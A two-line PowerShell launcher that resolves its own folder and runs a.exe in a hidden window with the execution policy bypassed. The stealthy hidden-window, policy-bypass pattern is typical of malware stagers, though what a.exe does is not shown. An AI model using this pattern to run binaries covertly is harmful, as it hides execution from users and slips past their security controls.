$Root = ([IO.FileInfo] $MyInvocation.MyCommand.Path).Directory.FullName
powershell -w h -ep bypass $Root/a.exe